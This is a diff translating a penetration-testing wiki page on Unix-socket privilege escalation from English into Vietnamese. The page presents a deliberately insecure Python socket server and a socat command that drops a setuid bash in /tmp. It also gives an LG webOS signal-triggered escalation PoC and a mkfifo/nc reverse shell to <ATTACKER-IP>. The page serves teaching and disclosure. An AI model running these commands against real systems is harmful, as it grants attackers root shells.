@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Socket binding example with Python
+## Ví dụ liên kết socket bằng Python
 
-In the following example a **unix socket is created** (`/tmp/socket_test.s`) and everything **received** is going to be **executed** by `os.system`.I know that you aren't going to find this in the wild, but the goal of this example is to see how a code using unix sockets looks like, and how to manage the input in the worst case possible.
+Trong ví dụ sau, một **unix socket được tạo** (`/tmp/socket_test.s`) và mọi thứ **nhận được** sẽ được **thực thi** bởi `os.system`. Tôi biết bạn sẽ không bắt gặp trường hợp này ngoài thực tế, nhưng mục tiêu của ví dụ là cho thấy mã sử dụng unix socket trông như thế nào và cách xử lý đầu vào trong trường hợp tệ nhất có thể.
 
 ```python:s.py
 import socket
@@ -28,7 +28,7 @@ while True:
     conn.close()
 ```
 
-**Execute** the code using python: `python s.py` and **check how the socket is listening**:
+**Thực thi** mã bằng python: `python s.py` và **kiểm tra socket đang lắng nghe như thế nào**:
 
 ```python
 netstat -a -p --unix | grep "socket_test"
@@ -43,20 +43,20 @@ unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
 
-## Case study: Root-owned UNIX socket signal-triggered escalation (LG webOS)
+## Nghiên cứu tình huống: Leo thang đặc quyền được kích hoạt bằng signal qua UNIX socket do root sở hữu (LG webOS)
 
-Some privileged daemons expose a root-owned UNIX socket that accepts untrusted input and couples privileged actions to thread-IDs and signals. If the protocol lets an unprivileged client influence which native thread is targeted, you may be able to trigger a privileged code path and escalate.<sup>[[1]](#references)[[2]](#references)</sup>
+Một số daemon đặc quyền cung cấp UNIX socket do root sở hữu, nhận đầu vào không đáng tin cậy và gắn các hành động đặc quyền với thread-ID và signal. Nếu giao thức cho phép client không đặc quyền kiểm soát native thread nào sẽ bị nhắm tới, bạn có thể kích hoạt một code path đặc quyền và leo thang đặc quyền.<sup>[[1]](#references)[[2]](#references)</sup>
 
-The primary write-up and disclosure describe the following sequence.<sup>[[1]](#references)[[2]](#references)</sup>
+Bài viết phân tích chính và thông tin công bố mô tả trình tự sau.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Observed pattern:
-- Connect to a root-owned socket (e.g., /tmp/remotelogger).
-- Create a thread and obtain its native thread id (TID).
-- Send the TID (packed) plus padding as a request; receive an acknowledgement.
-- Deliver a specific signal to that TID to trigger the privileged behaviour.
+Mẫu quan sát được:
+- Kết nối tới một socket do root sở hữu (ví dụ: /tmp/remotelogger).
+- Tạo một thread và lấy native thread id (TID) của nó.
+- Gửi TID (được đóng gói) cùng phần đệm làm request; nhận acknowledgement.
+- Gửi một signal cụ thể tới TID đó để kích hoạt hành vi đặc quyền.
 
-The condensed PoC below mirrors that sequence.<sup>[[1]](#references)[[2]](#references)</sup>
-Minimal PoC sketch:
+PoC rút gọn bên dưới mô phỏng trình tự đó.<sup>[[1]](#references)[[2]](#references)</sup>
+Phác thảo PoC tối giản:
 
 ```python
 import socket, struct, os, threading, time
@@ -70,20 +70,19 @@ s.recv(4)  # sync
 os.kill(tid, 4)  # deliver SIGILL (example from the case)
 ```
 
-To turn this into a root shell, a simple named-pipe + nc pattern can be used.<sup>[[2]](#references)</sup>
+Để biến điều này thành root shell, có thể sử dụng một mẫu named-pipe + nc đơn giản.<sup>[[2]](#references)</sup>
 
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
 
-Notes:
-- This class of bugs arises from trusting values derived from unprivileged client state (TIDs) and binding them to privileged signal handlers or logic.<sup>[[1]](#references)</sup>
-- Harden by enforcing credentials on the socket, validating message formats, and decoupling privileged operations from externally supplied thread identifiers.
+Ghi chú:
+- Loại lỗi này phát sinh khi tin cậy các giá trị bắt nguồn từ trạng thái của client không đặc quyền (TID) rồi gắn chúng với signal handler hoặc logic có đặc quyền.<sup>[[1]](#references)</sup>
+- Tăng cường bảo mật bằng cách áp dụng xác thực trên socket, xác thực định dạng thông điệp và tách các thao tác có đặc quyền khỏi các định danh luồng do bên ngoài cung cấp.
 
 ## References
 
-- [1] [Jailbreak webOS for fun (just for fun)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
-- [2] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
-
+- [1] [Jailbreak webOS cho vui (chỉ để giải trí)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
+- [2] [LG WebOS TV: Path Traversal, vượt qua xác thực và chiếm quyền kiểm soát hoàn toàn thiết bị (công bố của SSD)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 {{#include ../../banners/hacktricks-training.md}}
